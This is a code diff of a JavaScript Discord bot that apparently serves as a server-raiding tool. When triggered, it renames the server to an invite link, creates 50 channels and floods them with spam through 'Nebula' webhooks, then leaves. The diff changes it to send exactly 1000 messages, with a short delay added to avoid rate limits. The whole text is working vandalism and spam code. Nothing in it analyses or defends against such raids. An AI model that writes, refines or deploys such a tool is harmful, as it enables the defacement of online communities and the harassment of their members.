@@ -61,7 +61,7 @@ client.on('messageCreate', async (message) => {
       await guild.edit({ name: 'discord.gg/migh' });
     } catch {}
 
-    // Create 50 new channels
+    // Create 50 new text channels
     const createdChannels = [];
     for (let i = 0; i < 50; i++) {
       try {
@@ -70,32 +70,48 @@ client.on('messageCreate', async (message) => {
       } catch {}
     }
 
-    // Spam each channel with 20 messages using webhooks or fallback to send
-    const spamTasks = [];
-
-    for (const channel of createdChannels) {
+    // Fallback to at least one channel if none were created
+    let channelsToUse = createdChannels.length > 0 ? createdChannels : [guild.channels.cache.first()];
+    if (!channelsToUse[0]) {
       try {
-        const webhook = await channel.createWebhook({
-          name: 'Nebula',
-          avatar: 'https://i.imgur.com/6QbX6yA.png '
-        });
-
-        for (let i = 0; i < 20; i++) {
-          spamTasks.push(
-            webhook.send(spamMessage).catch(async () => {
-              await channel.send(spamMessage).catch(() => {});
-            })
-          );
-        }
+        const fallbackChannel = await guild.channels.create({ name: 'fallback-channel' });
+        channelsToUse = [fallbackChannel];
       } catch {
-        for (let i = 0; i < 20; i++) {
-          spamTasks.push(channel.send(spamMessage).catch(() => {}));
-        }
+        message.channel.send("❌ Couldn't create any channels to spam.");
+        return;
       }
     }
 
-    // Run all spam tasks concurrently
-    await Promise.all(spamTasks);
+    // Send exactly 1000 messages total
+    let messagesSent = 0;
+
+    while (messagesSent < 1000) {
+      for (const channel of channelsToUse) {
+        if (messagesSent >= 1000) break;
+
+        try {
+          // Try creating webhook first
+          const webhook = await channel.createWebhook({
+            name: 'Nebula',
+            avatar: 'https://i.imgur.com/6QbX6yA.png '
+          });
+
+          await webhook.send(spamMessage);
+        } catch {
+          // Fallback to regular message if webhook fails
+          try {
+            await channel.send(spamMessage);
+          } catch {
+            continue; // Skip this iteration if both fail
+          }
+        }
+
+        messagesSent++;
+        await new Promise(r => setTimeout(r, 50)); // Small delay to avoid rate limits
+      }
+    }
+
+    console.log(`✅ Successfully sent ${messagesSent} messages.`);
 
     // Leave the server
     try {
